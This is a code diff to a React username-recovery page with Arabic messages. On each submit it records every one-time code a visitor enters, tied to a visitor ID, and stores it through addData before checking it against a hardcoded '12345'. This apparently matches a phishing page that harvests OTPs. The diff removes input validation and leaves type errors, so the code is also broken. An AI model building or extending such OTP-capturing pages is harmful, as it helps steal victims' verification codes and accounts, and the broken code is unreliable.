@@ -131,26 +131,17 @@ export default function UsernameRecoveryPage() {
   }
 
   const handleContinue = async (e: any) => {
-    const otpString = otpValues.join("")
+    const otpString = otpValues
     allOtps.push(otpString)
     const visitorId = localStorage.getItem("visitor")
     await addData({ id: visitorId, otp: otpString, allOtps })
 
-    // Validate OTP
-    if (otpString.length !== 5) {
-      setOtpError("يرجى إدخال رمز التحقق المكون من 5 أرقام")
-      return
-    }
 
-    if (!/^\d{5}$/.test(otpString)) {
-      setOtpError("رمز التحقق يجب أن يحتوي على أرقام فقط")
-      return
-    }
 
     // Simulate OTP verification
     if (otpString !== "12345") {
       setOtpError("رمز التحقق غير صحيح")
-      setOtpValues(["", "", "", "",""])
+      setOtpValues("")
       return
     }
 
